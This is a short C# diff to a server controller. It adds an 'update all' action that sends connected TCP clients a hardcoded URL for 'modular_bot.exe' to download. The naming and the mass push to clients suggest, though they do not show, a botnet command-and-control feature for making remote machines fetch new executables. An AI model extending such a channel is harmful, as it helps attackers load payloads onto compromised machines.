@@ -37,6 +37,7 @@ namespace server.Controllers
             _view.StartStopRequested += OnStartStopRequested;
             _view.ClearLogRequested += OnClearLogRequested;
             _view.CopyLogRequested += OnCopyLogRequested;
+            _view.UpdateAllRequested += OnUpdateAllRequested;
 
             // Initialize the view
             InitializeView();
@@ -146,6 +147,26 @@ namespace server.Controllers
         }
 
         /// <summary>
+        /// Handles update all requests from the view
+        /// </summary>
+        /// <param name="sender">Event sender</param>
+        /// <param name="e">Event arguments</param>
+        private void OnUpdateAllRequested(object? sender, EventArgs e)
+        {
+            try
+            {
+                // For now, we'll use a hardcoded update URL
+                // In a real implementation, this would be configurable
+                string updateUrl = "http://192.168.1.100:8080/updates/modular_bot.exe";
+                SendUpdateToAllClients(updateUrl);
+            }
+            catch (Exception ex)
+            {
+                _view.ShowMessage($"Failed to send update command: {ex.Message}", "Error");
+            }
+        }
+
+        /// <summary>
         /// Handles server status changes from the model
         /// </summary>
         /// <param name="sender">Event sender</param>
@@ -198,6 +219,42 @@ namespace server.Controllers
         }
 
         /// <summary>
+        /// Sends an update command to all connected clients
+        /// </summary>
+        /// <param name="updateUrl">The URL where the new version can be downloaded</param>
+        public void SendUpdateToAllClients(string updateUrl)
+        {
+            try
+            {
+                _model.SendUpdateToAllClients(updateUrl);
+                _view.ShowMessage($"Update command sent to {_model.ConnectedClientsCount} clients", "Success");
+            }
+            catch (Exception ex)
+            {
+                _view.ShowMessage($"Failed to send update: {ex.Message}", "Error");
+            }
+        }
+
+        /// <summary>
+        /// Sends an update command to a specific client
+        /// </summary>
+        /// <param name="client">The client to update</param>
+        /// <param name="updateUrl">The URL where the new version can be downloaded</param>
+        public void SendUpdateToClient(System.Net.Sockets.TcpClient client, string updateUrl)
+        {
+            try
+            {
+                _model.SendUpdateToClient(client, updateUrl);
+                var clientAddress = ((System.Net.IPEndPoint)client.Client.RemoteEndPoint!).Address;
+                _view.ShowMessage($"Update command sent to client {clientAddress}", "Success");
+            }
+            catch (Exception ex)
+            {
+                _view.ShowMessage($"Failed to send update to client: {ex.Message}", "Error");
+            }
+        }
+
+        /// <summary>
         /// Disposes the controller and cleans up resources
         /// </summary>
         public void Dispose()
@@ -211,6 +268,7 @@ namespace server.Controllers
             _view.StartStopRequested -= OnStartStopRequested;
             _view.ClearLogRequested -= OnClearLogRequested;
             _view.CopyLogRequested -= OnCopyLogRequested;
+            _view.UpdateAllRequested -= OnUpdateAllRequested;
 
             // Stop server if running
             if (_model.IsServerRunning)
